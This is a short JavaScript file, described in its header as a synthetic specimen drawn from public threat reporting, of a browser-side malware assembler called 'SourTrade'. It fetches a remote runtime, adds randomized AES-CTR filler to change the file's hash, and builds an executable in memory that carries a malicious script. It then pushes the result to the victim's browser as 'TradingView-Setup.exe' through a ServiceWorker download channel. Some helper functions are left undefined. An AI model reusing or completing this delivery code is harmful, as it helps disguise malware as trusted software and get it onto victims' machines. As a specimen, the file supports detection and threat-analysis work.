// SourTrade browser-side assembler (synthetic specimen from public IOC reporting)
async function build() {
  const cfg = await (await fetch('/config')).json();
  // cfg fields: random.seed (b64), random.size (int), template[], standaloneUrl
  const seed = atob(cfg["random.seed"]);
  const size = cfg["random.size"];
  const tmpl = cfg["template"];
  const runtime = await fetch(cfg["standaloneUrl"]); // clean Bun runtime, gunzip
  const key = await crypto.subtle.importKey("raw", seedToKey(seed), "AES-CTR", false, ["encrypt"]);
  const filler = await crypto.subtle.encrypt({ name: "AES-CTR", counter: new Uint8Array(16), length: 64 }, key, new Uint8Array(size));
  const pe = assemble(runtime, tmpl, filler); // build PE in memory, malicious app.js in .bun section
  // deliver via ServiceWorker StreamSaver protocol
  navigator.serviceWorker.register('/sw.js');
  const ch = new MessageChannel();
  navigator.serviceWorker.controller.postMessage({ type: 'streamsaver:ping' });
  navigator.serviceWorker.controller.postMessage({ type: 'streamsaver:open', filename: 'TradingView-Setup.exe' }, [ch.port2]);
  streamOut(pe, ch.port1);
  // on error:
  // navigator.serviceWorker.controller.postMessage({ type: 'streamsaver:abort' });
  // response: application/octet-stream attachment via hidden iframe navigation
}
build();
